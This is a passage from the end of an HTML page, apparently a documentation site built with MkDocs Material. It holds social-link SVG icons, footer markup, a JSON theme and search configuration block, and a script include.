15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg> </a> <a href=https://twitter.com/dhrmns target=_blank rel=noopener title=twitter.com class=md-social__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 512 512"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg> </a> </div> </div> </div> </footer> </div> <div class=md-dialog data-md-component=dialog> <div class="md-dialog__inner md-typeset"></div> </div> <script id=__config type=application/json>{"base": "../..", "features": ["content.code.annotate", "navigation.indexes", "navigation.sections", "navigation.tabs", "navigation.top", "navigation.tracking", "search.highlight", "search.share", "search.suggest"], "search": "../../assets/javascripts/workers/search.361d90f1.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script> <script src=../../assets/javascripts/bundle.289a2a4b.min.js></script> </body> </html>